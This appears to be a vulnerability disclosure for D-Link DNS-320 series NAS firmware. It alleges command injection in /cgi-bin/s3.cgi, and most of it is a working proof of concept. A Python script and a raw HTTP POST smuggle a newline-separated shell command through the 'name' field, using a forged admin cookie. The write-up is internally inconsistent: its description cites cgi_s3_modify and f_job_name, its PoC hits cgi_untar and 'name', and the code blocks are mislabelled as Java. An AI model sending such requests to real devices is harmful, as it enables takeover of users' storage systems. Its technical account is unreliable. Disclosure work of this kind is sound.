# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_s3_modify function of the file /cgi-bin/s3.cgi.  The variable `f_job_name`is passed from a POST request and is assigned to `v10` via the `snprintf` function at line 35 and invoked by the `popen` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723734074971-288f52d5-e455-4637-9b16-9489fbb0cd3a.png#averageHue=%23fefdfd&clientId=u1ba2ba9a-8e66-4&from=paste&height=955&id=BRpmE&originHeight=955&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96320&status=done&style=none&taskId=u308fb8ee-9a04-4189-9fe8-0c939738875&title=&width=1668)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/s3.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_untar&name=%0atouch%09/tmp/123%0a.tar.tgz&path=122"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```java
POST /cgi-bin/s3.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_untar&name=%0atouch%09/tmp/123%0a.tar.tgz&path=122
```

